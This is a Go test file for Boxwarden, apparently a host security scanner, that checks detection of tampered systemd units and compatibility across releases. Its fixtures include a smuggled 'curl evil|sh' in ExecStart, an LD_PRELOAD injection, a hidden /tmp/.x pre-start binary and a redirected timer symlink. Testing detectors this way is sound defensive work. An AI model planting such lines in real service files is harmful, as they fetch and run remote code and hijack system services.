package check

import (
	"os"
	"path/filepath"
	"testing"
)

func TestOwnUnits(t *testing.T) {
	root := t.TempDir()
	scan := "[Unit]\nDescription=Boxwarden security scan\nAfter=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/boxwarden scan --push --skip cve\nProtectSystem=strict\nNice=10\n"
	write(t, root, "etc/systemd/system/boxwarden-scan.service", scan)
	write(t, root, "etc/systemd/system/boxwarden-cve.service", "[Service]\nExecStart=/usr/local/bin/boxwarden scan --push --checks cve\n")
	write(t, root, "etc/systemd/system/boxwarden-metrics.service", "[Service]\nExecStart=/usr/local/bin/boxwarden metrics --push\nExecStartPre=/tmp/.x\n")
	write(t, root, "etc/systemd/system/boxwarden-scan.timer", "[Timer]\nOnBootSec=2min\nOnUnitActiveSec=15min\n[Install]\nWantedBy=timers.target\n")
	os.MkdirAll(filepath.Join(root, "etc/systemd/system/timers.target.wants"), 0o755)
	os.Symlink("/etc/systemd/system/boxwarden-scan.timer", filepath.Join(root, "etc/systemd/system/timers.target.wants/boxwarden-scan.timer"))
	os.Symlink("/tmp/evil.timer", filepath.Join(root, "etc/systemd/system/timers.target.wants/boxwarden-cve.timer"))

	got := map[string]bool{}
	for _, f := range ownUnitFindings(root) {
		got[f.Title] = true
	}
	want := []string{
		"Boxwarden's own unit was modified: /etc/systemd/system/boxwarden-metrics.service",
		"Boxwarden's own unit was modified: /etc/systemd/system/timers.target.wants/boxwarden-cve.timer",
	}
	if len(got) != len(want) || !got[want[0]] || !got[want[1]] {
		t.Errorf("got %v", got)
	}
	if p := unitProblem("[Service]\nExecStart=/usr/local/bin/boxwarden scan --push; curl evil|sh\n"); p == "" {
		t.Error("extra command in ExecStart accepted")
	}

	// They stay out of the baseline: an update must not look like a break-in.
	if snap := Collect(root); snap["file"]["/etc/systemd/system/boxwarden-scan.service"] != "" {
		t.Error("own unit in the baseline")
	}
}

// Every released install.sh must pass: version skew during an update (new units, old binary or the
// reverse) once raised criticals on every host because v0.2.3 added Environment=GOMEMLIMIT.
func TestOwnUnitsEveryRelease(t *testing.T) {
	svc := func(exec string, extra ...string) string {
		s := "[Unit]\nDescription=Boxwarden\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/boxwarden " + exec + "\nProtectSystem=strict\nProtectHome=read-only\nNoNewPrivileges=yes\n"
		for _, e := range extra {
			s += e + "\n"
		}
		return s
	}
	v02 := []string{"TimeoutStartSec=15min", "MemoryMax=512M", "Nice=10"}
	v023 := []string{"TimeoutStartSec=15min", "MemoryMax=512M", "Environment=GOMEMLIMIT=384MiB", "Nice=10"}
	tests := []struct {
		name, unit string
		bad        bool
	}{
		{"v0.1 scan", svc("scan --push --checks ssh,ioc,exposed"), false},
		{"v0.1 cve", svc("scan --push --checks cve"), false},
		{"v0.2.0-v0.2.2 scan", svc("scan --push --skip cve", v02...), false},
		{"v0.2.0-v0.2.2 cve", svc("scan --push --checks cve", v02...), false},
		{"v0.2.0-v0.2.2 metrics", svc("metrics --push", v02...), false},
		{"v0.2.3 scan", svc("scan --push --skip cve", v023...), false},
		{"v0.2.3 cve", svc("scan --push --checks cve", v023...), false},
		{"v0.2.3 metrics", svc("metrics --push", v023...), false},
		{"other Environment", svc("scan --push", "Environment=LD_PRELOAD=/tmp/x.so"), true},
		{"other GOMEMLIMIT", svc("scan --push", "Environment=GOMEMLIMIT=1MiB"), true},
		{"unknown key", svc("scan --push", "User=nobody"), true},
	}
	for _, tt := range tests {
		if p := unitProblem(tt.unit); (p != "") != tt.bad {
			t.Errorf("%s: problem %q, want bad=%v", tt.name, p, tt.bad)
		}
	}
}
